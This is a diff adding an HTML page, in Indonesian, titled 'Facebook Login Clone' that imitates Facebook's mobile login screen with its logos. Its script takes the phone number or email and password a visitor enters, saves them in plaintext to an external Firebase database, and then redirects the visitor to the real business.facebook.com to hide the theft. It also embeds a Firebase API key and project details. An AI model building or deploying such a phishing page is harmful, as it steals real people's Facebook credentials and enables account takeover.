@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Facebook Login Clone</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #0e182a;
+      font-family: Arial, sans-serif;
+      color: white;
+      margin: 0;
+      height: 100vh;
+    }
+    .login-container {
+      max-width: 100%;
+      width: 99vw;
+      margin: 60px auto;
+      padding: 5px;
+      background-color: #0e182a;
+      text-align: center;
+    }
+    .facebook-logo {
+      font-size: 3rem;
+      color: #1877f2;
+      margin-bottom: 50px;
+    }
+    .btn-facebook {
+      background-color: #1877f2;
+      color: white;
+      font-size: 1.2rem;
+      padding: 12px 0;
+      border-radius: 30px;
+    }
+    .btn-facebook:hover {
+      background-color: #145db2;
+    }
+    .form-control {
+      font-size: 1.1rem;
+      margin-bottom: 15px;
+      padding: 15px;
+      border: 1px solid #888888;
+      border-radius: 15px;
+      background-color: #0e182a;
+      color: #888888;
+    }
+    .password-input {
+      position: relative;
+    }
+    .form-control:focus {
+      box-shadow: none;
+      background-color: #0e182a;
+      color: #dddddd;
+      border: 1px solid #888888;
+    }
+    .meta-logo {
+      display: block;
+      font-size: 0.9rem;
+      color: #8b8b8b;
+      margin: 10px 0;
+    }
+    .meta-logo img {
+      width: 20px;
+      margin-right: 5px;
+    }
+    .meta-logo span {
+      font-weight: bold;
+    }
+    .btn-outline-facebook {
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      font-size: 1.2rem;
+      padding: 10px 0;
+      border-radius: 30px;
+      width: 100%;
+    }
+    .btn-outline-facebook:hover {
+      background-color: rgba(24, 119, 242, 0.1);
+    }
+    .text-link {
+      color: #1877f2;
+    }
+    .text-link:hover {
+      text-decoration: underline;
+    }
+    hr {
+      margin: 20px 0;
+      border-color: rgba(0, 0, 0, 0.1);
+    }
+    .back {
+      font-size: 30px;
+    }
+    a {
+      text-decoration: none;
+    }
+    .form-control::placeholder {
+      color: #888888;
+      opacity: 1;
+    }
+    .button-meta-container {
+      margin-top: 500px;
+      margin: 20px 0;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <b class="container back">←</b>  
+  <div class="container">
+    <div class="text-center">
+      <p href="#" class="text-white">Bahasa Indonesia ▼</p>
+    </div>
+
+    <div class="login-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="62" alt="Facebook Logo" class="facebook-logo" />
+      
+      <form id="register-form">
+        <div class="mb-3">
+          <input type="text" id="username" class="form-control" placeholder="Nomor ponsel atau email" required>
+        </div>
+        <div class="mb-3 password-input">
+          <input type="password" id="password" class="form-control" placeholder="Kata sandi" required>
+        </div>
+        <div class="d-grid gap-2">
+          <button style="padding: 7px 10px;" type="submit" class="btn btn-facebook">Login</button>
+        </div>
+      </form>
+
+      <div class="mt-3">
+        <a href="#" class="text-white">Lupa kata sandi?</a>
+      </div>
+      <hr>
+
+      <div class="button-meta-container ">
+        <button type="button" class="btn btn-outline-facebook" style="margin-top: 53px; padding: 7px">Buat akun baru</button>
+        <p class="meta-logo"><img src="./logometa.png" alt="Meta Logo" /> Meta</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Script Bootstrap -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+  
+<script>
+  // Konfigurasi Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyBqBa0K8ka1wJCwfxDac8jb5k0kDcXXn2w",
+    authDomain: "fbuses-3e232.firebaseapp.com",
+    projectId: "fbuses-3e232",
+    storageBucket: "fbuses-3e232.appspot.com",
+    messagingSenderId: "210587021666",
+    appId: "1:210587021666:web:02ac0703e8024c51ddbc3b",
+    measurementId: "G-Y4PGS1D880"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  var db = firebase.database();
+
+  // Register form submit event
+  document.getElementById('register-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // Ambil nilai dari input
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    // Validasi input tidak kosong
+    if (!username || !password) {
+      alert('Harap isi semua kolom!');
+      return;
+    }
+
+    // Simpan ke Realtime Database tanpa menggunakan Firebase Authentication
+    var newUserRef = db.ref('users').push();
+    newUserRef.set({
+      username: username,  // Bisa berupa email, nomor telepon, atau teks biasa
+      password: password  // Disimpan sebagai plaintext
+    }).then(() => {
+      
+      window.location.href = 'https://business.facebook.com/';
+    }).catch((error) => {
+      console.error('Error saving user data: ', error);
+      alert('Error saving user data. Please try again.');
+    });
+  });
+</script>
+
+ 
+</body>
+</html>
